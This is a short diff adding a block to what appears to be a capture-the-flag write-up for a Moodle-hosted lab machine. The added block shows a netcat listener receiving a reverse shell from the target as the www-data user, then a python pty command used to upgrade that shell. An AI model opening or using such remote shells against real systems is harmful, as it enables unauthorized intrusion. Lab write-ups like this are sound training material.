@@ -93,3 +93,15 @@ added the parameter:
 
 Got a nc shell.
 
+```
+$nc -lvnp 6000
+listening on [any] 6000 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.153] 48092
+bash: cannot set terminal process group (829): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@teacher:/var/www/html/moodle/question$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@teacher:/var/www/html/moodle/question$ python -c 'import pty;pty.spawn("/bin/bash")'
+<tion$ python -c 'import pty;pty.spawn("/bin/bash")'
+```
